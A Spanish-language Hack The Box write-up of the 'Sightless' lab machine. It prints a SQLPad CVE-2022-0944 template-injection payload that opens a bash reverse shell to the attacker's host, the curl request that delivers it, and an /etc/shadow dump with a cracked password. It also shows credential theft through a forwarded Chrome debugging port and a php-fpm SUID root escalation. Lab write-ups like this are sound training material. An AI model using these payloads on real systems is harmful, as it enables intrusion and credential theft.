---
title: Sightless - Hack The Box
date: 2024-12-19
description: Maquina Sightless (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/sightless/
image: sightless.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.32 -oG allPorts
```

Puertos abiertos: 21, 22 y 80

## Análisis

```bash
nmap -sCV -p21,22,80 10.10.11.32 -oN targeted

21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

El puerto 80 da acceso a la web de http://sightless.htb.

Whatweb no da mucha información:
```bash
whatweb http://sightless.htb

http://sightless.htb [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

De http://sightless.htb destaca el enlace hacia un SQLPad de demo en http://sqlpad.sightless.htb.

Este SQLPad está en versión 6.10.0:
![SQLPad Version](sqlpadversion.png)

Buscando por vulnerabilidades para SQLPad en versión 6.10.0 devuelve el CVE-2022-0944 y un exploit en [Github](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944) que permite un RCE.


## Explotación

El exploit es un script en bash que se aprovecha de "child_process" en un módulo de Node.js para ejecutar código arbitrario y abrir una reverse shell a la máquina atacante.

Concretamente genera el siguiente payload:
```bash
POST_DATA=$(cat <<EOF
{
  "name": "divineclown",
  "driver": "mysql",
  "data": {
    "host": "",
    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
  },
  "host": "",
  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
}
EOF
)
```

Donde se puede ver la inyección a la database del módulo de Node.js "child_process" con la ejecución de la reverse shell:
```bash
process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')
```

Que posteriormente inyecta en una petición curl por POST contra la máquina víctima:
```bash
curl -i -s -k -X POST -H "Host: $TARGET" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$TARGET" -H "Referer: http://$TARGET/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$TARGET/api/test-connection" > /dev/null
```

Al lanzar el exploit se obtiene acceso a la maquina:
```bash
./CVE-2022-0944
Please make sure to start a listener on your attacking machine using the command:
nc -lvnp 9001
Waiting for you to set up the listener...
Press [Enter] when you are ready...
Please provide the target host (e.g., x.x.com): 
sqlpad.sightless.htb
Please provide your IP address (e.g., 10.10.16.3): 
10.10.14.120
Exploit sent. If everything went well, check your listener for a connection on port 9001.
```

```bash
nc -lvnp 9001
listening on [any] 9001 ...

connect to [10.10.14.120] from (UNKNOWN) [10.10.11.32] 38692
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami
root
```

Por el nemónico del equipo se puede intuir que la máquina es un contenedor.

Revisando el directorio "/" se observa el fichero ".dockerenv" lo que confirma que la máquina es un contenedor:
```bash
root@c184118df0a6:/# ls -la
ls -la
total 88
drwxr-xr-x   1 root root 4096 Aug  2 09:30 .
drwxr-xr-x   1 root root 4096 Aug  2 09:30 ..
-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
drwxr-xr-x   2 root root 4096 Feb 28  2022 bin
drwxr-xr-x   2 root root 4096 Oct  3  2021 boot
drwxr-xr-x   5 root root  340 Dec 19 15:19 dev
-rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint
drwxr-xr-x   1 root root 4096 Aug  6 11:23 etc
drwxr-xr-x   1 root root 4096 Aug  6 11:23 home
drwxr-xr-x   1 root root 4096 Mar  2  2022 lib
drwxr-xr-x   2 root root 4096 Feb 28  2022 lib64
drwxr-xr-x   2 root root 4096 Feb 28  2022 media
drwxr-xr-x   2 root root 4096 Feb 28  2022 mnt
drwxr-xr-x   1 root root 4096 Mar  2  2022 opt
dr-xr-xr-x 316 root root    0 Dec 19 15:19 proc
drwx------   1 root root 4096 Aug  9 09:42 root
drwxr-xr-x   3 root root 4096 Feb 28  2022 run
drwxr-xr-x   2 root root 4096 Feb 28  2022 sbin
drwxr-xr-x   2 root root 4096 Feb 28  2022 srv
dr-xr-xr-x  13 root root    0 Dec 19 15:19 sys
drwxrwxrwt   1 root root 4096 Mar  2  2022 tmp
drwxr-xr-x   1 root root 4096 Mar 12  2022 usr
drwxr-xr-x   1 root root 4096 Feb 28  2022 var
root@c184118df0a6:/# 
```

## Escalada

### User

Listando los usuarios de "/etc/passwd" se observan 2 usuarios además de root:
```bash
root@c184118df0a6:/# cat /etc/passwd 
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

Al ser root de la máquina, se pueden listar los usuarios del "/etc/shadow":
```bash
root@c184118df0a6:/# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Pasando el hash de "michael" por John The Ripper se obtiene la contraseña "insaneclownposse":
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (?)     
1g 0:00:00:40 DONE (2024-12-19 17:19) 0.02473g/s 1446p/s 1446c/s 1446C/s kruimel..ilovetyson
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Probando el acceso por SSH con el usuario "michael" y la contraseña "insaneclownposse" se obtiene acceso a la máquina host y la flag de "user.txt":
```bash
ssh michael@sightless.htb
The authenticity of host 'sightless.htb (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Thu Dec 19 15:25:32 2024 from 10.10.14.43
michael@sightless:~$ ls
user.txt
michael@sightless:~$ 
```

### Root

Listando los ficheros con permisos de root:
```bash
find / -perm -4000 -user root 2>/dev/null
/opt/google/chrome/chrome-sandbox
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nada destacable.

Listando los usuarios de la maquina se observa otro usuario a parte de "Michael", "John":
```bash
michael@sightless:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
michael:x:1000:1000:michael:/home/michael:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:120:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:116:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:117:65534::/srv/ftp:/usr/sbin/nologin
john:x:1001:1001:,,,:/home/john:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Listando puertos abiertos se observa el puerto 8080:
```bash
michael@sightless:/home$ netstat -putona
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:38953         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:48923         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:42657         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
```

Dado que el puerto solo está accesible a la maquina local, se trae por forwarding a la máquina atacante:
```bash
ssh -v -N -L 8080:localhost:8080 michael@sightless.htb
```

Y se observa que se trata de un servidor de "froxlor":

![Froxlor](froxlor.png)

Buscando vulnerabilidades de froxlor no se encuentra ninguna que no necesite credenciales.

Continuando la busqueda con el resto de puertos abiertos se observa que están ejecutando una automatización de chrome, lo que apunta a una consola de desarrollo de chrome:
```bash
michael@sightless:/home$ ps aux |grep 48923      
john        1635  0.5  0.3 33630172 15352 ?      Sl   15:21   0:42 /home/john/automation/chromedriver --port=48923
michael     5140  0.0  0.0   7008  2188 pts/2    S+   17:22   0:00 grep --color=auto 48923
```

Se traen los puertos abiertos a la máquina atacante:
```bash
ssh -L 48923:127.0.0.1:48923 -L 38953:127.0.0.1:38953 -L 33060:127.0.0.1:33060 michael@sightless.htb
```

Se ejecuta chrome, se accede a las DevTools en "chrome://inspect/#devices" y se añaden los puertos redirigidos:

![Targets](devtools_targets.png)

Y posteriorme las DevTools se conectarán al target:

![DevTools](devtools.png)

Se "inspecciona" y se abrirá chrome con la web de froxlor.

Cuando el automatismo se logea en la web, es posible inspeccionar el "index.php" que contiene las credenciales de admin en la sección "payload":

![froxlor](pwned.png)

Estas credenciales (admin/ForlorfroxAdmin) permiten el acceso a froxlor.

Froxlor, a su vez, controla el motor php-fpm, el cual permite ejecución de comandos. Generando una versión que ejecute el comando al reiniciarse, permite dar permisos SUID a "/bin/bash":

![php-fpm](phpfpm.png)

Reiniciando php-fpm desde "System->Settings->PHP-FPM" y ejecutando "/bin/bash -p" desde la terminal previamente abierta con usuario michael, obtenemos acceso como root y acceso a la flag de root:
```bash
michael@sightless:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# ls /root/ 
docker-volumes	root.txt  scripts
bash-5.1# 
```